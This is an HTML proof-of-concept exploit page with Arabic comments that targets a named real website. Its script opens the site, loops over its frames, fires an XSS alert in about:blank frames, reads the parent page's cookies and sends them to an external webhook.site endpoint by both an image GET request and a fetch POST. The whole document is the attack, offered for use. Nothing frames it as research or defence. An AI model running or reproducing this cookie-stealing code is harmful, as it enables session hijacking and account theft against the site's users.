<!DOCTYPE html>
<html>
<head>
    <title>PoC - iFrame Exploit</title>
</head>
<body>
    <h2>جاري الاختبار...</h2>
    <button onclick="startAttack()">بدء الاستغلال</button>
    
    <script>
        const TARGET = 'https://www.powerpak.com/';
        const EXFIL_SERVER = 'https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f/log'; // استبدل بخادمك
        
        function startAttack() {
            // فتح الموقع المستهدف
            const win = window.open(TARGET, 'target', 'width=1000,height=800');
            
            setTimeout(() => {
                exploitFrames(win);
            }, 3000);
        }
        
        function exploitFrames(targetWindow) {
            try {
                // المرور على جميع الفريمات
                for (let i = 0; i < targetWindow.frames.length; i++) {
                    const frame = targetWindow.frames[i];
                    
                    // التحقق من أن الفريم about:blank
                    if (frame.location.href === 'about:blank') {
                        
                        // 🚨 1. عمل Alert لإثبات XSS
                        frame.alert('XSS Confirmed! Domain: ' + frame.document.domain);
                        
                        // 🚨 2. سرقة Cookies وإرسالها للخادم الخارجي
                        const stolenCookies = frame.parent.document.cookie;
                        
                        // طريقة 1: إرسال via GET (صورة)
                        new Image().src = EXFIL_SERVER + '?cookies=' + encodeURIComponent(stolenCookies) + '&t=' + Date.now();
                        
                        // طريقة 2: إرسال via POST (Fetch)
                        fetch(EXFIL_SERVER, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                cookies: stolenCookies,
                                url: frame.parent.location.href,
                                time: new Date().toISOString()
                            })
                        });
                        
                        console.log('✅ Frame', i, 'exploited!');
                        console.log('🍪 Cookies:', stolenCookies);
                    }
                }
            } catch(e) {
                console.error('Error:', e.message);
            }
        }
    </script>
</body>
</html>
